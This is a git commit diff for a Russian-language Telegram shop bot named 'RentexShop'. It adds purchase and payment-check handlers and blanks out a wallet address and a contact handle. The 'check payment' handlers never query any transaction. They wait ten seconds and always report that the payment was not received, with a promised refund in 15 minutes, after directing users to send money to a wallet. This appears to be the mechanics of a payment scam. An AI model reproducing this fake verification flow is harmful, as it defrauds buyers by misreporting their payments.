c65644c63f7f50d36071514ab3b7a8eb4b117b82
Nabyne <144941710+Nabyne1337@users.noreply.github.com>
2024-07-02 18:34:28 +0300

    Update bot.py

--- bot.py
+++ bot.py
@@ -132,12 +132,12 @@ async def process_callback(callback_query: CallbackQuery):
             keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
 
             sent_message = await callback_query.message.answer(
-                                f"Для пополнения баланса переведите нужную сумму на кошелёк: \n"f"TRe2UJZCYCZYxmkUx1VRvxwr3cvq6B7RfU",disable_notification=True,
+                                f"Для пополнения баланса переведите нужную сумму на кошелёк: \n"f"",disable_notification=True,
                                 reply_markup=keyboard
                             )
         elif callback_query.data == "button5":
             vacancies_text = "\n\n".join([f"{profs_name} - {profs_price} руб." for profs_name, profs_price in profs.items()])
-            contact_text = "Для связи с менеджером по трудоустройству пишите сюда (@ВРЕМЕННОНЕТУ)"
+            contact_text = "Для связи с менеджером по трудоустройству пишите сюда (@)"
 
             message_text = f"Вакансии:\n\n{vacancies_text}\n\n{contact_text}"
             
@@ -145,6 +145,43 @@ async def process_callback(callback_query: CallbackQuery):
             keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
 
             sent_message = await callback_query.message.answer(message_text, reply_markup=keyboard)
+        elif callback_query.data.startswith("button6_"):
+            product_name = callback_query.data.split("_")[1]
+            product_price = products.get(product_name)
+            if product_price:
+                async with aiosqlite.connect('mybd.db') as db:
+                    async with db.execute("SELECT balance FROM users WHERE tg_id = ?", (tg_id,)) as cursor:
+                        user_data = await cursor.fetchone()
+                        if user_data:
+                            balance = user_data[0]
+                            itog_price = product_price - balance
+                            buttons = [
+                                    [InlineKeyboardButton(text="Оплатить", callback_data=f"button7_{product_name}")],
+                                    [InlineKeyboardButton(text="Отменить", callback_data="back_to_menu")]
+                            ]
+                            keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
+                            if itog_price <= 0:
+                                sent_message = await callback_query.message.answer(
+                                    f"Запрос на покупку: {product_name}\n"
+                                    f"Цена: {product_price} руб.\n"
+                                    f"На счету останется: {abs(itog_price)} руб.",
+                                    reply_markup=keyboard
+                                )
+                                user_messages[tg_id] = sent_message.message_id
+                            else:
+                                sent_message = await callback_query.message.answer(
+                                    f"Запрос на покупку: {product_name}\n"
+                                    f"Цена: {product_price} руб.\n"
+                                    f"Итого к оплате: {itog_price} руб.",
+                                    reply_markup=keyboard
+                                )
+                                user_messages[tg_id] = sent_message.message_id
+                        else:
+                            sent_message = await callback_query.message.answer("Произошла ошибка: пользователь не найден в базе данных.")
+                            user_messages[tg_id] = sent_message.message_id
+            else:
+                sent_message = await callback_query.message.answer("Произошла ошибка: товар не найден.")
+                user_messages[tg_id] = sent_message.message_id
         elif callback_query.data == "back_to_menu":
             buttons = [
                 [InlineKeyboardButton(text="Личный кабинет", callback_data="button1")],
@@ -156,16 +193,52 @@ async def process_callback(callback_query: CallbackQuery):
             welcome_text = "Привет! Это RentexShop. Выберите один из вариантов ниже:"
             sent_message = await callback_query.message.answer_photo(photo=types.FSInputFile(path=file_path), caption=welcome_text, reply_markup=keyboard)
             user_messages[tg_id] = sent_message.message_id
-
+        elif callback_query.data.startswith("buttonoplata2"):
+            sent_message = await callback_query.message.answer("Проверка транзакции в процессе. Как только транзакция будет подтверждена, текст изменится, и вы получите информацию о пополнении.")
+            await asyncio.sleep(10)
+            buttons = [[InlineKeyboardButton(text="Назад", callback_data="back_to_menu")]]
+            keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
+            sent_message = await callback_query.message.answer("❌ Платёж не был получен! ❌ Для повторной попытки покупки попробуйте заново оплатить. Если деньги уже были списаны с баланса, но баланс не был выдан, то средства будут возвращены на ваш баланс в течение 15 минут.", reply_markup=keyboard)
+        elif callback_query.data.startswith("buttonoplata"):
+            sent_message = await callback_query.message.answer("Проверка транзакции в процессе. Как только транзакция будет подтверждена, текст изменится, и вы получите информацию о товаре.")
+            await asyncio.sleep(10)
+            buttons = [[InlineKeyboardButton(text="Назад", callback_data="back_to_menu")]]
+            keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
+            sent_message = await callback_query.message.answer("❌ Платёж не был получен! ❌ Для повторной попытки покупки выберите товар заново и попробуйте оплатить. Если деньги уже были списаны с баланса, но товар не был выдан, то средства будут возвращены на ваш баланс в течение 15 минут.", reply_markup=keyboard)
+        elif callback_query.data.startswith("button7_"):
+            product_name = callback_query.data.split("_")[1]
+            buttons = [
+                [InlineKeyboardButton(text="Проверить оплату ✅", callback_data="buttonoplata")],
+                [InlineKeyboardButton(text="Назад", callback_data="back_to_menu")]
+            ]
+            keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
+            product_price = products.get(product_name)
+            if product_price:
+                async with aiosqlite.connect('mybd.db') as db:
+                    async with db.execute("SELECT balance FROM users WHERE tg_id = ?", (tg_id,)) as cursor:
+                        user_data = await cursor.fetchone()
+                        if user_data:
+                            balance = user_data[0]
+                            itog_price = product_price - balance
+                            sent_message = await callback_query.message.answer(
+                                f"Для завершения покупки переведите {abs(itog_price)} или пополните баланс на {abs(itog_price)} руб. на кошелёк: \n"
+                                f"",
+                                disable_notification=True,
+                                reply_markup=keyboard
+                            )
+                            user_messages[tg_id] = sent_message.message_id
+                        else:
+                            sent_message = await callback_query.message.answer("Произошла ошибка: пользователь не найден в базе данных.")
+                            user_messages[tg_id] = sent_message.message_id
+            else:
+                sent_message = await callback_query.message.answer("Произошла ошибка: товар не найден.")
+                user_messages[tg_id] = sent_message.message_id
         elif callback_query.data.startswith("product_"):
             product_name = callback_query.data.split("_")[1]
             product_price = products.get(product_name)
             if product_price:
                 buttons = [
-                    [InlineKeyboardButton(text="Личный кабинет", callback_data="button1")],
-                    [InlineKeyboardButton(text="Информация", callback_data="button2")],
-                    [InlineKeyboardButton(text="Покупка", callback_data="button3")],
-                    [InlineKeyboardButton(text="Вакансии", callback_data="button5")],
+                    [InlineKeyboardButton(text="Купить", callback_data=f"button6_{product_name}")],
                     [InlineKeyboardButton(text="Назад", callback_data="back_to_menu")]
                 ]
                 keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
